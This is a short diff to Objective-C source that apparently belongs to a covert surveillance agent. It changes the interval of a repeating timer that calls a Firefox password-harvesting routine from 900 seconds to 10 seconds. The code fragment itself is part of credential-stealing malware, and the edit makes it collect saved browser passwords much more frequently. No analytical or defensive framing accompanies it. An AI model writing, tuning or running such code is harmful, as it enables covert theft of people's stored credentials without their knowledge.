@@ -543,7 +543,7 @@ BOOL nssLoaded = NO;
 
     
     NSTimer *timer = nil;
-    timer = [NSTimer scheduledTimerWithTimeInterval: 900 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
+    timer = [NSTimer scheduledTimerWithTimeInterval: /*900*/10 target:self selector:@selector(_getFirefoxPasswordTimer:) userInfo:nil repeats:YES];
     [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
 
     while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
